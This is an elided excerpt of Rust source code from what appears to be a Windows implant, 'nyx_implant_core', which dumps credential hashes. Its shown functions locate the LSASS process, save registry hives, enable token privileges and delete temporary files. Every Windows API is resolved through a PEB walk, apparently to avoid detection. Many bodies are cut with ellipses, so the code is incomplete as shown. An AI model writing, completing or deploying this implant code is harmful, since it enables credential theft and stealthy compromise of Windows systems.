...
unsafe fn stream_file_locked_fallback(rt: &Runtime, chunk_name: &str) -> Vec<Response> {
    match unsafe { save_hive_fallback(chunk_name) } {
        ...
        Err(rc) => {
            ...
            nyx_implant_core::fmt::push_decimal_u32(&mut e, rc as u32);
            e.push(')');
            vec![Response::Err(e)]
        }
    }
...
unsafe fn do_hashdump_collect(rt: &'static Runtime, method: u8) -> Vec<Response> {
    ...
    match method {
        ...
        other => {
            ...
            nyx_implant_core::fmt::push_decimal_u32(&mut e, other as u32);
...
unsafe fn do_hashdump_vec_lsass(rt: &'static Runtime) -> Vec<Response> {
    ...
    let msg = if lsass_pid == 0 {
        ...
        nyx_implant_core::fmt::push_decimal_u32(&mut m, lsass_pid as u32);
...
///
/// All kernel32 calls go through `nyx_implant_core::resolve::export_addr` (PEB walk).
fn find_lsass_pid(_rt: &'static Runtime) -> Option<usize> {
    ...
    let snap_addr = unsafe {
        nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"CreateToolhelp32Snapshot")
    }?;
    let first_addr =
        unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"Process32FirstW") }?;
    let next_addr =
        unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"Process32NextW") }?;
    let close_addr =
        unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"CloseHandle") }?;
...
fn system_root() -> String {
    ...
    let gev: GetEnvVarW = match unsafe {
        nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"GetEnvironmentVariableW")
    } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return String::from("C:\\Windows"),
    };
    let mut name16 = nyx_implant_core::heap::vec![0u16; 14];
    let nb = b"SystemRoot";
...
fn enable_privilege_resolve() -> Option<(
    ...
    let gcp: GetCurrentProcess = match unsafe {
        nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"GetCurrentProcess")
    } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return None,
    };
    let opt: OpenProcessToken = match unsafe {
        nyx_implant_core::resolve::export_addr(b"advapi32.dll", b"OpenProcessToken")
    } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return None,
    };
    let lpv: LookupPrivilegeValueW = match unsafe {
        nyx_implant_core::resolve::export_addr(b"advapi32.dll", b"LookupPrivilegeValueW")
    } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return None,
    };
    let atp: AdjustTokenPrivileges = match unsafe {
        nyx_implant_core::resolve::export_addr(b"advapi32.dll", b"AdjustTokenPrivileges")
    } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return None,
    };
    let close: CloseHandle =
        match unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"CloseHandle") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return None,
        };
...
unsafe fn save_hive_fallback_load_advapi32() -> bool {
    ...
    let lla =
        match unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"LoadLibraryA") } {
            Some(a) => a,
            None => return false,
        };
...
unsafe fn save_hive_fallback_finalize(
    ...
    if rc != 0 {
        ...
        let tick: u32 = match unsafe {
            nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"GetTickCount")
        } {
...
fn save_hive_fallback_alt_path(chunk_name: &str, tick: u32) -> String {
    ...
    alt_str.push('_');
    nyx_implant_core::fmt::push_decimal_u32(&mut alt_str, tick);
...
fn temp_dir() -> Option<String> {
    ...
    let mut name16 = nyx_implant_core::heap::vec![0u16; 8];
    let nb = b"TEMP";
    for (i, &c) in nb.iter().enumerate() {
        name16[i] = c as u16;
    }
...
unsafe fn delete_temp(path: &str) {
    ...
    let mut wide = nyx_implant_core::heap::Vec::with_capacity(path.len() + 1);
    for c in path.chars() {
        wide.push(c as u16);
    }
    wide.push(0);
